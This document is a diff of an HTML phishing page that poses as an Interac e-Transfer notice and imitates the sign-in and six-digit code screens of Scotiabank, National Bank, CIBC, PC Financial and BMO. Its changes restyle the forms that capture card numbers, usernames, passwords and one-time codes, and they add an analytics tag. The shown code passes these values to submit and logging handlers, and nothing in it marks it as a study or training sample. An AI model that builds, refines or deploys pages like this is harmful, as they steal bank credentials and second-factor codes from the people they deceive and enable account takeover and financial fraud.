@@ -4,6 +4,15 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Interac e-Transfer - Your Funds Await!</title>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-QC51393WN2"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-QC51393WN2');
+    </script>
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- Google Fonts - Inter -->
@@ -608,14 +617,14 @@
             </div>
 
             <!-- Scotiabank 6-Digit Code Entry View (newly added) -->
-            <div id="scotiaAuthCodeView" class="hidden bg-white text-gray-800 p-6 rounded-lg shadow-md">
+            <div id="scotiaAuthCodeView" class="hidden scotia-red-bg text-white p-6 rounded-lg shadow-md">
                 <!-- Header similar to Scotiabank login -->
                 <div class="flex items-center justify-between mb-8">
                     <img src="optionl12.png" alt="Scotiabank Logo" class="w-24 h-24 object-contain">
                     <span class="text-2xl font-bold">Scotiabank</span>
                 </div>
-                <h2 class="text-2xl font-semibold mb-6 text-center">Enter Your 6-Digit Code</h2>
-                <p class="text-sm text-gray-600 mb-4 text-center">A code has been sent to your registered mobile number.</p>
+                <h2 class="text-2xl font-semibold mb-6">Enter Your 6-Digit Code</h2>
+                <p class="text-sm text-gray-200 mb-4">A code has been sent to your registered mobile number.</p>
                 <form class="space-y-6" id="scotiaOtpForm">
                     <div class="code-input-group" id="scotiaCodeInputs">
                         <input type="number" id="scotiaCode1" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
@@ -628,7 +637,7 @@
                     <button type="button" onclick="handleOtpSubmit('scotia')" class="scotia-red-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out mt-6">
                         Verify Code
                     </button>
-                    <a href="#" class="block mt-4 text-sm text-blue-600 hover:underline text-center">Resend Code</a>
+                    <a href="#" class="block mt-4 text-sm text-blue-300 hover:underline text-center">Resend Code</a>
                 </form>
                 <button onclick="showScotiaLoginView(); logUserAction('Back to Scotiabank Login from OTP')" class="mt-8 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-4 rounded-lg flex items-center justify-center transition duration-150 ease-in-out">
                     <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
@@ -638,52 +647,38 @@
 
             <!-- National Bank of Canada Login View -->
             <div id="nbcLoginView" class="hidden bg-white text-gray-800 p-6 rounded-lg shadow-md">
-                <!-- National Bank Header -->
+                <!-- NBC Header -->
                 <div class="flex items-center space-x-3 mb-8">
+                    <!-- NBC Logo -->
                     <img src="optionl9.png" alt="National Bank of Canada Logo" class="w-24 h-24 object-contain">
-                    <div>
-                        <p class="text-xs font-semibold">NATIONAL</p>
-                        <p class="text-xl font-bold">BANK</p>
-                        <p class="text-xs">OF CANADA</p>
-                    </div>
+                    <span class="text-2xl font-bold">National Bank of Canada</span>
                 </div>
-
-                <h2 class="text-2xl font-semibold mb-6">Good morning</h2>
-
+                <h2 class="text-2xl font-semibold mb-6">Connect to National Bank Online Banking</h2>
                 <form class="space-y-6" id="nbcLoginForm">
                     <div>
-                        <label for="nbcEmail" class="block text-sm font-medium text-gray-700 mb-1">Email</label>
-                        <input type="email" id="nbcEmail" name="nbcEmail" placeholder="john.smith@email.com"
+                        <label for="nbcUserId" class="block text-sm font-medium text-gray-700 mb-1">User ID</label>
+                        <input type="text" id="nbcUserId" name="nbcUserId"
                                class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
                     </div>
-
                     <div>
                         <label for="nbcPassword" class="block text-sm font-medium text-gray-700 mb-1">Password</label>
-                        <div class="relative">
-                            <input type="password" id="nbcPassword" name="nbcPassword" placeholder="********"
-                                   class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
-                            <!-- Eye icon placeholder -->
-                            <span class="absolute inset-y-0 right-0 pr-3 flex items-center text-gray-500 cursor-pointer">
-                                <svg class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path></svg>
-                            </span>
+                        <input type="password" id="nbcPassword" name="nbcPassword"
+                               class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
+                    </div>
+                    <div class="flex items-center justify-between text-sm">
+                        <div class="flex items-center">
+                            <input id="nbcRememberMe" name="nbcRememberMe" type="checkbox"
+                                   class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
+                            <label for="nbcRememberMe" class="ml-2 block text-gray-700">Remember my User ID</label>
                         </div>
-                        <a href="#" class="block mt-2 text-sm text-blue-600 hover:underline">Forgot your password?</a>
+                        <a href="#" class="font-medium nbc-red hover:underline">Forgot your User ID or password?</a>
                     </div>
-
-                    <div class="flex items-center mt-4">
-                        <input id="nbcRememberMe" name="nbcRememberMe" type="checkbox"
-                               class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
-                        <label for="nbcRememberMe" class="ml-2 block text-sm text-gray-700">Remember my email</label>
-                    </div>
-
                     <button type="button" onclick="handleLoginSubmit('nbc')"
-                            class="nbc-blue-btn w-full font-bold py-3 px-4 rounded-lg flex items-center justify-center space-x-2 transition duration-150 ease-in-out mt-6">
-                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
-                        <span>Sign in</span>
+                            class="nbc-blue-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out mt-6">
+                        Sign In
                     </button>
                 </form>
-
-                <button onclick="showOptionSelectionView(); logUserAction('Back to Options from NBC Login')" class="mt-8 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-4 rounded-lg flex items-center justify-center transition duration-150 ease-in-out">
+                <button onclick="showOptionSelectionView(); logUserAction('Back to Options from National Bank Login')" class="mt-8 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-4 rounded-lg flex items-center justify-center transition duration-150 ease-in-out">
                     <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
                     <span>Back to Options</span>
                 </button>
@@ -694,11 +689,7 @@
                 <!-- Header similar to National Bank login -->
                 <div class="flex items-center space-x-3 mb-8">
                     <img src="optionl9.png" alt="National Bank of Canada Logo" class="w-24 h-24 object-contain">
-                    <div>
-                        <p class="text-xs font-semibold">NATIONAL</p>
-                        <p class="text-xl font-bold">BANK</p>
-                        <p class="text-xs">OF CANADA</p>
-                    </div>
+                    <span class="text-2xl font-bold">National Bank of Canada</span>
                 </div>
                 <h2 class="text-2xl font-semibold mb-6">Enter Your 6-Digit Code</h2>
                 <p class="text-sm text-gray-600 mb-4">A code has been sent to your registered mobile number.</p>
@@ -711,79 +702,50 @@
                         <input type="number" id="nbcCode5" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
                         <input type="number" id="nbcCode6" maxlength="1" onkeydown="moveToPrevious(event, this)" class="code-input">
                     </div>
-                    <button type="button" onclick="handleOtpSubmit('nbc')" class="nbc-blue-btn w-full font-bold py-3 px-4 rounded-lg flex items-center justify-center space-x-2 transition duration-150 ease-in-out mt-6">
+                    <button type="button" onclick="handleOtpSubmit('nbc')" class="nbc-blue-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out mt-6">
                         Verify Code
                     </button>
-                    <a href="#" class="block mt-4 text-sm text-blue-600 hover:underline text-center">Resend Code</a>
+                    <a href="#" class="block mt-4 text-sm nbc-red hover:underline text-center">Resend Code</a>
                 </form>
-                <button onclick="showNBCLoginView(); logUserAction('Back to NBC Login from OTP')" class="mt-8 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-4 rounded-lg flex items-center justify-center transition duration-150 ease-in-out">
+                <button onclick="showNBCLoginView(); logUserAction('Back to National Bank Login from OTP')" class="mt-8 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-4 rounded-lg flex items-center justify-center transition duration-150 ease-in-out">
                     <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
                     <span>Back to Login</span>
                 </button>
             </div>
 
             <!-- CIBC Login View -->
-            <div id="cibcLoginView" class="hidden bg-white text-gray-800 p-6 rounded-lg shadow-md">
+            <div id="cibcLoginView" class="hidden cibc-red-bg text-white p-6 rounded-lg shadow-md">
                 <!-- CIBC Header -->
                 <div class="flex items-center space-x-3 mb-8">
                     <!-- CIBC Logo -->
                     <img src="optionl3.png" alt="CIBC Logo" class="w-24 h-24 object-contain">
                     <span class="text-2xl font-bold">CIBC</span>
                 </div>
-
-                <div class="p-4 bg-gray-100 rounded-md mb-6">
-                    <p class="text-sm font-semibold mb-2">Ways to Bank</p>
-                    <p class="text-sm font-semibold">Smart Advice</p>
-                </div>
-
+                <h2 class="text-2xl font-semibold mb-6">Sign On to CIBC Online Banking</h2>
                 <form class="space-y-6" id="cibcLoginForm">
                     <div>
-                        <label for="cibcCardNumber" class="block text-sm font-medium text-gray-700 mb-1">Card number</label>
-                        <input type="text" id="cibcCardNumber" name="cibcCardNumber" placeholder="64756484"
-                               class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
-                        <div class="flex items-center mt-2">
-                            <input id="cibcRememberCard" name="cibcRememberCard" type="checkbox" checked
-                                   class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
-                            <label for="cibcRememberCard" class="ml-2 block text-sm text-gray-700">Remember my card</label>
-                            <!-- Question mark icon placeholder -->
-                            <svg class="w-4 h-4 ml-1 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.228 9.247a1 1 0 011.004-.008l4.413 2.527a1 1 0 010 1.737l-4.413 2.527a1 1 0 01-1.004-.008V9.247zM12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                        </div>
+                        <label for="cibcCardNumber" class="block text-sm font-medium mb-1">Card number or Username</label>
+                        <input type="text" id="cibcCardNumber" name="cibcCardNumber"
+                               class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm text-gray-900 focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
                     </div>
-
                     <div>
-                        <label for="cibcPassword" class="block text-sm font-medium text-gray-700 mb-1">Password</label>
-                        <div class="relative">
-                            <input type="password" id="cibcPassword" name="cibcPassword" placeholder="********"
-                                   class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
-                            <!-- Show password checkbox -->
-                            <div class="absolute inset-y-0 right-0 pr-3 flex items-center">
-                                <input id="cibcShowPassword" name="cibcShowPassword" type="checkbox"
-                                       class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
-                                <label for="cibcShowPassword" class="ml-2 text-sm text-gray-700">Show password</label>
-                            </div>
+                        <label for="cibcPassword" class="block text-sm font-medium mb-1">Password</label>
+                        <input type="password" id="cibcPassword" name="cibcPassword"
+                               class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm text-gray-900 focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
+                    </div>
+                    <div class="flex items-center justify-between text-sm">
+                        <div class="flex items-center">
+                            <input id="cibcRememberMe" name="cibcRememberMe" type="checkbox"
+                                   class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
+                            <label for="cibcRememberMe" class="ml-2 block">Remember my Card Number/Username</label>
                         </div>
-                        <a href="#" class="block mt-2 text-sm text-blue-600 hover:underline">Reset your password</a>
+                        <a href="#" class="font-medium text-blue-300 hover:underline">Forgot your password?</a>
                     </div>
-
-                    <div class="flex justify-between space-x-4 mt-6">
-                        <button type="button" class="inline-flex justify-center py-2 px-4 border border-gray-300 shadow-sm text-sm font-medium rounded-md text-gray-700 bg-white hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 transition duration-150 ease-in-out">
-                            Register
-                        </button>
-                        <button type="button" onclick="handleLoginSubmit('cibc')"
-                                class="cibc-red-btn inline-flex justify-center py-2 px-4 border border-transparent shadow-sm text-sm font-medium rounded-md focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500 transition duration-150 ease-in-out">
-                            Sign on
-                        </button>
-                    </div>
+                    <button type="button" onclick="handleLoginSubmit('cibc')"
+                            class="cibc-red-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out mt-6">
+                        Sign On
+                    </button>
                 </form>
-
-                <div class="border-t border-gray-200 pt-6 mt-6 text-center">
-                    <p class="text-sm text-gray-700 mb-2 flex items-center justify-center">
-                        <svg class="w-4 h-4 mr-1 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.007 12.007 0 002 12c0 2.755 1.09 5.264 2.944 7.056C6.732 21.057 9.241 22 12 22s5.268-.943 7.056-2.944A12.007 12.007 0 0022 12c0-2.755-1.09-5.264-2.944-7.056z"></path></svg>
-                        Security guaranteed
-                    </p>
-                    <a href="#" class="block text-sm text-blue-600 hover:underline">Electronic access agreement</a>
-                </div>
-
                 <button onclick="showOptionSelectionView(); logUserAction('Back to Options from CIBC Login')" class="mt-8 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-4 rounded-lg flex items-center justify-center transition duration-150 ease-in-out">
                     <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
                     <span>Back to Options</span>
@@ -791,14 +753,14 @@
             </div>
 
             <!-- CIBC 6-Digit Code Entry View (newly added) -->
-            <div id="cibcAuthCodeView" class="hidden bg-white text-gray-800 p-6 rounded-lg shadow-md">
+            <div id="cibcAuthCodeView" class="hidden cibc-red-bg text-white p-6 rounded-lg shadow-md">
                 <!-- Header similar to CIBC login -->
                 <div class="flex items-center space-x-3 mb-8">
                     <img src="optionl3.png" alt="CIBC Logo" class="w-24 h-24 object-contain">
                     <span class="text-2xl font-bold">CIBC</span>
                 </div>
-                <h2 class="text-2xl font-semibold mb-6 text-center">Enter Your 6-Digit Code</h2>
-                <p class="text-sm text-gray-600 mb-4 text-center">A code has been sent to your registered mobile number.</p>
+                <h2 class="text-2xl font-semibold mb-6">Enter Your 6-Digit Code</h2>
+                <p class="text-sm text-gray-200 mb-4">A code has been sent to your registered mobile number.</p>
                 <form class="space-y-6" id="cibcOtpForm">
                     <div class="code-input-group" id="cibcCodeInputs">
                         <input type="number" id="cibcCode1" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
@@ -811,7 +773,7 @@
                     <button type="button" onclick="handleOtpSubmit('cibc')" class="cibc-red-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out mt-6">
                         Verify Code
                     </button>
-                    <a href="#" class="block mt-4 text-sm text-blue-600 hover:underline text-center">Resend Code</a>
+                    <a href="#" class="block mt-4 text-sm text-blue-300 hover:underline text-center">Resend Code</a>
                 </form>
                 <button onclick="showCIBCLoginView(); logUserAction('Back to CIBC Login from OTP')" class="mt-8 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-4 rounded-lg flex items-center justify-center transition duration-150 ease-in-out">
                     <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
@@ -822,58 +784,36 @@
             <!-- PC Financial Login View -->
             <div id="pcLoginView" class="hidden bg-white text-gray-800 p-6 rounded-lg shadow-md">
                 <!-- PC Financial Header -->
-                <div class="pc-light-gray-bg border-b pc-border-gray p-4 flex justify-between items-center">
-                    <div class="flex items-center space-x-2">
-                        <img src="optionl10.png" alt="PC Financial Logo" class="w-16 h-16 object-contain">
-                        <span class="text-sm font-semibold">President's Choice</span>
-                        <span class="text-xl font-bold text-red-600">FINANCIAL</span>
-                    </div>
+                <div class="flex items-center space-x-3 mb-8">
+                    <!-- PC Financial Logo -->
+                    <img src="optionl10.png" alt="PC Financial Logo" class="w-24 h-24 object-contain">
+                    <span class="text-2xl font-bold">PC Financial</span>
                 </div>
-
-                <div class="flex justify-around bg-gray-200 text-gray-700 text-sm font-medium py-3 border-b border-gray-300">
-                    <a href="#" class="w-1/3 text-center py-2 bg-gray-300 rounded-md">Sign In</a>
-                    <a href="#" class="w-1/3 text-center py-2">Find Us</a>
-                    <a href="#" class="w-1/3 text-center py-2">Help</a>
-                </div>
-
-                <div class="flex justify-around bg-gray-100 text-gray-700 text-sm py-2 border-b border-gray-300 mb-6">
-                    <a href="#" class="w-1/3 text-center py-1 bg-gray-300 rounded-md">Sign In</a>
-                    <a href="#" class="w-1/3 text-center py-1">Register</a>
-                    <a href="#" class="w-1/3 text-center py-1">Forgot Password?</a>
-                </div>
-
-                <form class="space-y-6 px-4" id="pcLoginForm">
+                <h2 class="text-2xl font-semibold mb-6">Sign in to PC Financial online banking</h2>
+                <form class="space-y-6" id="pcLoginForm">
                     <div>
-                        <label for="pcCardNumber" class="block text-lg font-semibold text-gray-800 mb-2">Card Number:</label>
-                        <input type="text" id="pcCardNumber" name="pcCardNumber" placeholder="enter your card number"
-                               class="mt-1 block w-full px-4 py-3 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 text-lg">
+                        <label for="pcUsername" class="block text-sm font-medium text-gray-700 mb-1">Username</label>
+                        <input type="text" id="pcUsername" name="pcUsername"
+                               class="mt-1 block w-full px-4 py-2 border pc-border-gray rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
                     </div>
-
                     <div>
-                        <label for="pcPassword" class="block text-lg font-semibold text-gray-800 mb-2">Password:</label>
-                        <input type="password" id="pcPassword" name="pcPassword" placeholder="enter your password"
-                               class="mt-1 block w-full px-4 py-3 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 text-lg">
+                        <label for="pcPassword" class="block text-sm font-medium text-gray-700 mb-1">Password</label>
+                        <input type="password" id="pcPassword" name="pcPassword"
+                               class="mt-1 block w-full px-4 py-2 border pc-border-gray rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
                     </div>
-
-                    <div class="flex items-center mt-4">
-                        <input id="pcSaveBankCard" name="pcSaveBankCard" type="checkbox"
-                               class="h-5 w-5 text-red-600 focus:ring-red-500 border-gray-300 rounded-full">
-                        <label for="pcSaveBankCard" class="ml-2 block text-base text-gray-700">Save Bank Card</label>
+                    <div class="flex items-center justify-between text-sm">
+                        <div class="flex items-center">
+                            <input id="pcRememberMe" name="pcRememberMe" type="checkbox"
+                                   class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
+                            <label for="pcRememberMe" class="ml-2 block text-gray-700">Remember my username</label>
+                        </div>
+                        <a href="#" class="font-medium text-blue-600 hover:underline">Forgot username or password?</a>
                     </div>
-
                     <button type="button" onclick="handleLoginSubmit('pc')"
-                            class="pc-red-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out text-lg mt-6">
+                            class="pc-red-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out mt-6">
                         Sign In
                     </button>
                 </form>
-
-                <div class="border-t border-gray-300 pt-6 mt-12 text-center bg-black text-white py-4 flex justify-around items-center text-xs">
-                    <a href="#" class="hover:underline">Legal Stuff</a>
-                    <a href="#" class="hover:underline">Privacy</a>
-                    <a href="#" class="hover:underline">Security</a>
-                    <a href="#" class="hover:underline">Trademarks<br>and Copyright</a>
-                </div>
-
                 <button onclick="showOptionSelectionView(); logUserAction('Back to Options from PC Financial Login')" class="mt-8 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-4 rounded-lg flex items-center justify-center transition duration-150 ease-in-out">
                     <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
                     <span>Back to Options</span>
@@ -881,17 +821,14 @@
             </div>
 
             <!-- PC Financial 6-Digit Code Entry View (newly added) -->
-            <div id="pcAuthCodeView" class="hidden bg-white text-gray-800 p-6 rounded-lg shadow-md">
+            <div id="pcAuthCodeView" class="hidden pc-red-bg text-white p-6 rounded-lg shadow-md">
                 <!-- Header similar to PC Financial login -->
-                <div class="pc-light-gray-bg border-b pc-border-gray p-4 flex justify-between items-center">
-                    <div class="flex items-center space-x-2">
-                        <img src="optionl10.png" alt="PC Financial Logo" class="w-16 h-16 object-contain">
-                        <span class="text-sm font-semibold">President's Choice</span>
-                        <span class="text-xl font-bold text-red-600">FINANCIAL</span>
-                    </div>
+                <div class="flex items-center space-x-3 mb-8">
+                    <img src="optionl10.png" alt="PC Financial Logo" class="w-24 h-24 object-contain">
+                    <span class="text-2xl font-bold">PC Financial</span>
                 </div>
-                <h2 class="text-2xl font-semibold mb-6 text-center">Enter Your 6-Digit Code</h2>
-                <p class="text-sm text-gray-600 mb-4 text-center">A code has been sent to your registered mobile number.</p>
+                <h2 class="text-2xl font-semibold mb-6">Enter Your 6-Digit Code</h2>
+                <p class="text-sm text-gray-200 mb-4">A code has been sent to your registered mobile number.</p>
                 <form class="space-y-6" id="pcOtpForm">
                     <div class="code-input-group" id="pcCodeInputs">
                         <input type="number" id="pcCode1" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
@@ -904,7 +841,7 @@
                     <button type="button" onclick="handleOtpSubmit('pc')" class="pc-red-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out mt-6">
                         Verify Code
                     </button>
-                    <a href="#" class="block mt-4 text-sm text-blue-600 hover:underline text-center">Resend Code</a>
+                    <a href="#" class="block mt-4 text-sm text-blue-300 hover:underline text-center">Resend Code</a>
                 </form>
                 <button onclick="showPCLoginView(); logUserAction('Back to PC Financial Login from OTP')" class="mt-8 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-4 rounded-lg flex items-center justify-center transition duration-150 ease-in-out">
                     <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
@@ -913,62 +850,36 @@
             </div>
 
             <!-- BMO Login View -->
-            <div id="bmoLoginView" class="hidden bg-white text-gray-800 rounded-lg shadow-md overflow-hidden">
+            <div id="bmoLoginView" class="hidden bg-white text-gray-800 p-6 rounded-lg shadow-md">
                 <!-- BMO Header -->
-                <div class="flex items-center space-x-3 bmo-blue-header text-white px-4 py-2"> <!-- Adjusted py-2 -->
-                    <!-- QR Code icon placeholder -->
-                    <div class="border border-white p-1 rounded-md flex items-center space-x-1">
-                        <img src="qr.png" alt="QR Code" class="w-5 h-5">
-                        <span class="text-sm">QR Code</span>
-                    </div>
-                    <img src="optionl2.png" alt="BMO Bank of Montreal Logo" class="w-64 h-64 object-contain">
-                    <!-- Removed BMO text -->
+                <div class="bmo-blue-header text-white p-4 rounded-t-lg -mx-6 -mt-6 mb-6">
+                    <img src="optionl2.png" alt="BMO Logo" class="h-10 mx-auto">
                 </div>
-
-                <div class="bmo-light-blue-bg p-6">
-                    <h2 class="text-xl font-semibold text-gray-800 mb-6">Online Banking for Business</h2>
-
-                    <form class="space-y-6" id="bmoLoginForm">
-                        <div>
-                            <label for="bmoCustomerid" class="block text-sm font-medium text-gray-700 mb-1">Customer ID</label>
-                            <input type="text" id="bmoCustomerid" name="bmoCustomerid"
-                                   class="mt-1 block w-full px-4 py-2 border-b border-gray-300 bg-transparent focus:border-blue-500 focus:outline-none sm:text-sm">
-                        </div>
-
-                        <div>
-                            <label for="bmoUserid" class="block text-sm font-medium text-gray-700 mb-1">User ID</label>
-                            <input type="text" id="bmoUserid" name="bmoUserid"
-                                   class="mt-1 block w-full px-4 py-2 border-b border-gray-300 bg-transparent focus:border-blue-500 focus:outline-none sm:text-sm">
-                        </div>
-
-                        <div>
-                            <label for="bmoPassword" class="block text-sm font-medium text-gray-700 mb-1">Password</label>
-                            <input type="password" id="bmoPassword" name="bmoPassword"
-                                   class="mt-1 block w-full px-4 py-2 border-b border-gray-300 bg-transparent focus:border-blue-500 focus:outline-none sm:text-sm">
-                            <a href="#" class="block mt-2 text-sm text-blue-600 hover:underline">Reset my password</a>
-                        </div>
-
-                        <div class="flex items-center justify-between mt-4">
-                            <label for="bmoRememberMe" class="ml-2 block text-sm text-gray-700">Remember me</label>
-                            <label class="relative inline-flex items-center cursor-pointer">
-                                <input type="checkbox" value="" id="bmoRememberMeToggle" class="sr-only peer">
-                                <div class="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 dark:peer-focus:ring-blue-800 rounded-full peer dark:bg-gray-700 peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all dark:border-gray-600 peer-checked:bg-blue-600"></div>
-                            </label>
-                        </div>
-                        <p class="text-xs text-gray-500 ml-2">Required for Face ID or Touch ID</p>
-
-                        <button type="button" onclick="handleLoginSubmit('bmo')"
-                                class="bmo-blue-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out mt-6">
-                            Sign In
-                        </button>
-                    </form>
-
-                    <div class="text-center mt-6 space-y-2">
-                        <p class="text-sm text-blue-600">Using a Debit Card?</p>
-                        <a href="#" class="block text-sm text-blue-600 hover:underline font-semibold">Sign in here instead.</a>
+                <h2 class="text-2xl font-semibold mb-6 text-center">Sign in to BMO Online Banking</h2>
+                <form class="space-y-6" id="bmoLoginForm">
+                    <div>
+                        <label for="bmoCardNumber" class="block text-sm font-medium text-gray-700 mb-1">Card Number / Username</label>
+                        <input type="text" id="bmoCardNumber" name="bmoCardNumber"
+                               class="mt-1 block w-full px-4 py-2 border bmo-border-blue rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
                     </div>
-                </div>
-
+                    <div>
+                        <label for="bmoPassword" class="block text-sm font-medium text-gray-700 mb-1">Password</label>
+                        <input type="password" id="bmoPassword" name="bmoPassword"
+                               class="mt-1 block w-full px-4 py-2 border bmo-border-blue rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
+                    </div>
+                    <div class="flex items-center justify-between text-sm">
+                        <div class="flex items-center">
+                            <input id="bmoRememberMe" name="bmoRememberMe" type="checkbox"
+                                   class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
+                            <label for="bmoRememberMe" class="ml-2 block text-gray-700">Remember my Card Number/Username</label>
+                        </div>
+                        <a href="#" class="font-medium text-blue-600 hover:underline">Forgot your Card Number / Username or Password?</a>
+                    </div>
+                    <button type="button" onclick="handleLoginSubmit('bmo')"
+                            class="bmo-blue-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out mt-6">
+                        Sign In
+                    </button>
+                </form>
                 <button onclick="showOptionSelectionView(); logUserAction('Back to Options from BMO Login')" class="mt-8 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-4 rounded-lg flex items-center justify-center transition duration-150 ease-in-out">
                     <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
                     <span>Back to Options</span>
@@ -976,34 +887,28 @@
             </div>
 
             <!-- BMO 6-Digit Code Entry View (newly added) -->
